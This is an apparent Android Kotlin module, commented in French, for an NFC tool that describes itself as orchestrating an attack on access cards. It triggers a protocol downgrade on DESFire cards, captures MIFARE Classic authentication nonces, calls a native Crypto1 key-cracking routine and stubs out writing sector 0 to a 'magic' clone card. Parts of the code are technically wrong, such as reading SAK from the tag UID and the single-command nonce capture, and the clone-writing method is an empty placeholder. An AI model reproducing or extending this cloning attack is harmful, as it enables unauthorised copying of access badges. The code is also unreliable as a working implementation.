package com.forcetac

import android.nfc.NfcAdapter
import android.nfc.Tag
import android.nfc.tech.NfcA
import com.facebook.react.bridge.ReactApplicationContext
import com.facebook.react.bridge.ReactContextBaseJavaModule
import com.facebook.react.bridge.ReactMethod
import com.facebook.react.modules.core.DeviceEventManagerModule

/**
 * NfcModule - Gère le cycle de vie de l'attaque
 * Orchestre le sniffing passif et l'appel au moteur C++
 */
class NfcModule(private val reactContext: ReactApplicationContext) : 
    ReactContextBaseJavaModule(reactContext), NfcAdapter.ReaderCallback {

    init {
        System.loadLibrary("forcetac_core")
    }

    override fun getName() = "NfcModule"

    // Fonctions Natives C++
    external fun crackCrypto1(nonces: ByteArray): String?
    external fun checkDowngradeEligibility(sak: Int): Boolean

    override fun onTagDiscovered(tag: Tag) {
        val nfcA = NfcA.get(tag)
        val sak = tag.id[0].toInt() // Simplification pour détection protocole

        emit("FIELD_DETECTED", null)

        // Logique de Downgrade
        if (sak == 0x20) { // Si AES (DESFire) détecté
            emit("DOWNGRADE_TRIGGERED", null)
            // Note: Le switch réel vers SAK 0x08 est géré par HceService.kt
            return
        }

        try {
            nfcA.connect()
            // Capture des nonces (Sniffing Sandwich)
            val authResponse = nfcA.transceive(byteArrayOf(0x60.toByte(), 0x00.toByte()))
            
            if (authResponse != null) {
                emit("NONCES_CAPTURED", null)
                val key = crackCrypto1(authResponse)
                if (key != null) {
                    emit("KEY_RECOVERED", key)
                } else {
                    emit("ERROR", "Échec du calcul MFKey32")
                }
            }
        } catch (e: Exception) {
            emit("ERROR", e.localizedMessage)
        } finally {
            nfcA.close()
        }
    }

    @ReactMethod
    fun writeToMagicCard(key: String) {
        // Logique d'écriture sur puce CUID (Gen2)
        // [Implémentation d'écriture brute du Secteur 0]
    }

    private fun emit(type: String, key: String?) {
        val params = com.facebook.react.bridge.Arguments.createMap().apply {
            putString("type", type)
            if (key != null) putString("key", key)
        }
        reactContext.getJSModule(DeviceEventManagerModule.RCTDeviceEventEmitter::class.java)
            .emit("onNfcEvent", params)
    }
}
